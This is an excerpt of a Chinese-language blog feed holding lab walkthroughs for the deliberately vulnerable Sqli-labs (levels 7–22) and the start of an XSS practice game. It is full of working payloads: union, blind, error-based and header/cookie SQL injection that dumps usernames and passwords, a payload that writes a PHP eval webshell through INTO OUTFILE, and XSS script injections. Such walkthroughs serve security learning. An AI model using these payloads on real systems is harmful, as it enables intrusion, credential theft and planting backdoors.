1=1--+</code>，注释以后任然报错，说明是有括号的，逐个加括号测试即可；</p><p>然后就是进行数据库导出文件，尝试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) union select * from users into outfile &quot;D:\\1.txt&quot;--+</span><br></pre></td></tr></table></figure><p>发现mysql报错，指定路径下也没有该文件，可能原因如下：</p><h3 id="First"><a href="#First" class="headerlink" title="First"></a>First</h3><p>猜想：可能是权限不够，需要root权限才可以对数据库进行读写，用以下语句测试权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) and (select count(*) from mysql.user)&gt;0--+</span><br></pre></td></tr></table></figure><p>回显正常，说明不是权限不够的问题；</p><h3 id="Second"><a href="#Second" class="headerlink" title="Second"></a>Second</h3><p>猜想：可能是需要在指定的目录下进行数据的导出操作，<code>secure_file_priv</code>这个参数用来限制数据导入和导出操作的效果，先查看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure%&apos;;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/08/kzznaj.png" alt="kzznaj.png"></p><p>结果为NULL， </p><blockquote><p>1.如果这个参数为空，这个变量没有效果；<br>2.如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它；<br>3.如果这个参数为<code>null</code>，Mysql服务会禁止导入和导出操作；</p></blockquote><p>在MYSQL配置文件my.ini添加<code>secure_file_priv=</code>，再次查看得到结果不为NULL，因为没有设置指定的目录，所以任意目录都可以进行导入和导出；</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h4 id="1-写入木马"><a href="#1-写入木马" class="headerlink" title="1.写入木马"></a>1.写入木马</h4><p>直接使用outfile的写文件功能向指定文件夹上传木马，连接菜刀即可；</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos; into outfile &apos;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\1.php&apos; --+</span><br></pre></td></tr></table></figure><h4 id="2-导出文件"><a href="#2-导出文件" class="headerlink" title="2. 导出文件"></a>2. 导出文件</h4><p>直接将users表单内容导出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;)) union select * from users into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\sqli-labs-master\\Less-7\\2.txt&quot;--+</span><br></pre></td></tr></table></figure><h2 id="less-8-bool盲注"><a href="#less-8-bool盲注" class="headerlink" title="less-8(bool盲注)"></a>less-8(bool盲注)</h2><p>其实和第5关相比就是注释掉了<code>print_r(mysql_error())</code>，是个bool盲注，只是不可以使用报错注入而已；</p><p><img src="https://s2.ax1x.com/2019/03/12/AiG7o6.png" alt="AiG7o6.png"></p><p>所以直接构造逻辑判断盲注即可：</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27%20and%20ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><h2 id="less-9-时间盲注-单引号"><a href="#less-9-时间盲注-单引号" class="headerlink" title="less-9(时间盲注-单引号)"></a>less-9(时间盲注-单引号)</h2><p>这一关和前面的第8关的区别就是没有回显，是一个时间盲注，直接闭合引号后时间盲注即可；</p><p>payload:</p><p>1.爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((database()),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>2.爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=105,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>3.爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>4.爆数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select password from users limit 0,1),1,1))=68,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>其实就是一个暴力破解的过程(二分法提高效率)</p><h2 id="less-10-时间盲注-双引号"><a href="#less-10-时间盲注-双引号" class="headerlink" title="less-10(时间盲注-双引号)"></a>less-10(时间盲注-双引号)</h2><p>测试单引号<code>?id=1&#39; and sleep(5)--+</code>没有延时，说明不是单引号，试一下双引号即可；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and sleep(5)--+</span><br></pre></td></tr></table></figure><p>接下来除了双引号，和less-9一样；</p><h2 id="less-11-Post注入"><a href="#less-11-Post注入" class="headerlink" title="less-11(Post注入)"></a>less-11(Post注入)</h2><p>无从下手就查看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>这里的uname和passwd都是通过post请求传入的，这里我们需要使用到bp截包修改传递参数的内容；首先闭合引号后，构造永真语句查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; or 1=1--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:Dumb<br>Your Password:Dumb</p></blockquote><p>成功回显，所以直接就可以查询列数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; order by 2--+</span><br></pre></td></tr></table></figure><p>发现是有两列的，然后继续构造union select查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select 1,2--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFR0JO.png" alt="AFR0JO.png"></p><p>发现可以查询到1,2列的东西，那就可以利用这两个位置来回显想要的东西了；构造如下语句：</p><p>1.爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),version()--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFRRTP.png" alt="AFRRTP.png"></p><p>2.爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFWl7t.png" alt="AFWl7t.png"></p><p>3.爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFWUXj.png" alt="AFWUXj.png"></p><p>4.爆数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFWgc4.png" alt="AFWgc4.png"></p><p>其实无非就是传参方式变了而已，友情提示：新版hackbar是坑，谨慎使用；</p><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>其实和上一题类似，只是闭合方式变了而已，需要用到双引号加小括号闭合，payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot;) or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>尝试单引号失败，双引号失败，发现应该没有那么简单，直接查看源码发现如下内容：</p><p>1.闭合方式是<code>&#39;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>2.不会返回SQL查询语句的内容</p><p><img src="https://s2.ax1x.com/2019/03/13/AFfqiV.png" alt="AFfqiV.png"></p><p>3.发现针对查询结果对错的返回页面的图片不一样</p><p>正确：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&apos;;</span><br></pre></td></tr></table></figure><p>错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&apos;;</span><br></pre></td></tr></table></figure><p>这里演示2种方法：</p><h3 id="solution1-concat报错"><a href="#solution1-concat报错" class="headerlink" title="solution1(concat报错)"></a>solution1(concat报错)</h3><p>1.爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>2.爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>3.爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>4.爆数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><h3 id="solution2-逻辑判断"><a href="#solution2-逻辑判断" class="headerlink" title="solution2(逻辑判断)"></a>solution2(逻辑判断)</h3><p>思路：首先我们post一个错误的uname和passwd过去，然后构造or语句后面跟上查询语句，这样的话第一句话为flase，如果第二个查询也为flase，则会回显错误图片slap.jpg，否则回显正确图片flag.jpg</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) or ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+</span><br></pre></td></tr></table></figure><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>除了闭合方式为双引号，其他和less-13一样，不再赘述；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot; or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>闭合方式为单引号，其他和less-13一样，不再赘述；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>闭合方式为双引号加括号：<code>&quot;)</code>，其余和less-13一致；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot;) or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>这是在用uname查询之前经过的check_input()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line">$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">&#123;</span><br><span class="line">$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>1</strong>. 若<code>uname</code>非空，截取它的前15个字符。<br><strong>2</strong>. 若php环境变量<code>magic_quotes_gpc</code>打开，去除转义的反斜杠<code>\</code>。<br><strong>3</strong>. 若<code>uname</code>字符串非数字，将其中特殊字符转义；为数字则将其转为数字类型。</p></blockquote><p>这只说明一个问题，注入点不在uname，在passwd，查看源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;</span><br><span class="line">mysql_query($update);</span><br></pre></td></tr></table></figure><p>直接报错注入即可</p><p>爆库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select database() limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆数据出现问题：</p><blockquote><p>You can’t specify target table ‘users’ for update in FROM clause</p><p>应该是不能对同一个表同时进行update和select</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>所以需要构造子查询去得到数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; and updatexml(1,concat(0x7e,(select username from (select username from users) as a limit 1,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>注到这里，回去学习一下username的过滤函数：</p><blockquote><p>1.<code>get_magic_quotes_gpc()</code>函数取得PHP环境配置的变量<code>magic_quotes_gpc(GPC, Get/Post/Cookie)</code>值。返回<code>0</code>表示本功能关闭，返回<code>1</code>表示本功能打开。当<code>magic_quotes_gpc</code>打开时，所有的<code>&#39;(单引号)</code>、<code>&quot;(双引号)</code>、<code>\(反斜杠)</code>和<code>NULL(空字符)</code>会自动转为含有反斜杠的溢出字符;</p><p>2.<code>stripslashes(string)</code>函数删除由<code>addslashes()</code>函数添加的反斜杠;</p><p>3.<code>ctype_digit(string)</code>函数检查字符串中每个字符是否都是十进制数字，若是则返回<code>TRUE</code>，否则返回<code>FALSE</code>;</p><p>4.<code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;\x00</span><br><span class="line">&gt;\n</span><br><span class="line">&gt;\r</span><br><span class="line">&gt;\</span><br><span class="line">&gt;&apos;</span><br><span class="line">&gt;&quot;</span><br><span class="line">&gt;\x1a</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>进来就显示IP，猜测是http头注入，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">$sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>发现对uname和passwd都做了过滤，不存在注入点，继续向上面看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];<span class="comment">//是服务端根据请求TCP包的ip指定的</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your IP ADDRESS is: '</span> .$IP;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure><p>所以此时想到修改XFF头看看回显，然而并没有什么luan用，看到上面的UA头，查看到源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;</span><br></pre></td></tr></table></figure><p><strong>先成功登陆一下！！！！！！！</strong>输入<code>1&#39;</code>发现UA确实是存在注入点</p><p><img src="https://s2.ax1x.com/2019/04/23/EEBx0g.png" alt="EEBx0g.png"></p><p>存在注入点，使用updatexml注入：</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/04/23/EE0PEj.png" alt="EE0PEj.png"></p><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>先登陆：</p><p><img src="https://s2.ax1x.com/2019/04/23/EEDnAJ.png" alt="EEDnAJ.png"></p><p>应该和上一题类似，只不过改成了referer头而已，测试<code>1&#39;</code>报错:</p><p><img src="https://s2.ax1x.com/2019/04/23/EEDL59.png" alt="EEDL59.png"></p><p>这就很简单了，直接报错注入：</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/04/23/EErF5d.png" alt="EErF5d.png"></p><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>登陆：</p><p><img src="https://s2.ax1x.com/2019/04/23/EErnr8.png" alt="EErnr8.png"></p><p>发现提示为Cookie，想到Cookie注入，测试<code>uname=1&#39;</code>报错：</p><p><img src="https://s2.ax1x.com/2019/04/23/EErdZF.png" alt="EErdZF.png"></p><p>尝试报错注入：</p><p><img src="https://s2.ax1x.com/2019/04/23/EErrGR.png" alt="EErrGR.png"></p><p><img src="https://s2.ax1x.com/2019/04/23/EErbsf.png" alt="EErbsf.png"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>登入：</p><p><img src="https://s2.ax1x.com/2019/04/23/EEspzq.png" alt="EEspzq.png"></p><p>发现一串base64编码，解一下发现为Dumb为用户名，说明可能是让我们base64编码以后再传入数据：</p><p>尝试<code>1&#39;</code>报错，再尝试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>继续报错，base64一下再发包：报错注入成功</p><p><img src="https://s2.ax1x.com/2019/04/23/EEscfs.png" alt="EEscfs.png"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=MScgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSksMSkgYW5kICcxJz0nMQ==</span><br></pre></td></tr></table></figure><h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>和上一关没有什么区别，就是换了双引号而已，</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=MSIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSksMSkgYW5kICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/04/23/EEyVnf.png" alt="EEyVnf.png"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>…</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Sqli-labs初体验~
    
    </summary>
    
      <category term="靶场通关笔记" scheme="https://gardenia30.top/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Sql注入" scheme="https://gardenia30.top/tags/Sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>XSS小游戏通关笔记</title>
    <link href="https://gardenia30.top/2019/04/03/XSS%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/04/03/XSS小游戏通关笔记/</id>
    <published>2019-04-03T03:21:16.000Z</published>
    <updated>2019-04-09T09:29:15.400Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>XSS-初体验~<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><p>第一关非常基础，黑盒下传参name构造<code>?name=&lt;script&gt;alert(&#39;hacker&#39;);&lt;/script&gt;</code>即可弹窗，属于反射性XSS；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看源码发现没有过滤…</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h2><p>第二关也没有什么难度，黑盒下在输入框中测试test，查看页面的html发现<code>&lt;input name=keyword  value=&quot;test&quot;&gt;</code>直接闭合双引号和input标签，构造<code>?keyword=&quot;&gt;&lt;script&gt;alert(&#39;hacker&#39;);&lt;/script&gt;</code>即可弹窗；同样是属于反射型XSS；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure><p>查看源码，果然…</p><h2 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h2><p>界面和第二关差不多，黑盒下测试输入test2333，查看页面html发现<code>&lt;input name=keyword  value=&#39;test2333&#39;&gt;</code>，发现是单引号闭合，尝试闭合引号和标签：</p><p><code>?keyword=&#39;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code>，却发现：</p><p><code>&lt;input name=keyword  value=&#39;&#39;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;xss&#39;);&amp;lt;/script&amp;gt;&#39;&gt;</code></p><p>看样子是设置了特殊字符转码，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span 